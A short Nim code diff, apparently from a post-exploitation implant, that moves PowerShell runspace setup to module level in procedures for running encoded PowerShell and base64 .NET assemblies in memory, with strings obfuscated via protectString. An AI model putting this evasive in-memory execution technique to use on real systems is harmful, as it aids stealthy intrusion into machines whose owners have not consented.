@@ -2,10 +2,13 @@ import std/[strutils]
 import winim/[clr]
 import nimprotect
 
+
+var Automation = load(protectString("System.Management.Automation"))
+var RunspaceFactory = Automation.GetType(protectString("System.Management.Automation.Runspaces.RunspaceFactory"))
+
+
 proc execute_encoded_powershell*(encoded_command: string): string =
     var output: string
-    var Automation = load(protectString("System.Management.Automation"))
-    var RunspaceFactory = Automation.GetType(protectString("System.Management.Automation.Runspaces.RunspaceFactory"))
     var runspace = @RunspaceFactory.CreateRunspace()
     runspace.Open()
     var pipeline = runspace.CreatePipeline()
@@ -22,8 +25,6 @@ proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, stri
     var is_success: bool
     var output = "\n"
     try:
-        var Automation = load(protectString("System.Management.Automation"))
-        var RunspaceFactory = Automation.GetType(protectString("System.Management.Automation.Runspaces.RunspaceFactory"))
         var runspace = @RunspaceFactory.CreateRunspace()
         runspace.Open()
         var pipeline = runspace.CreatePipeline()
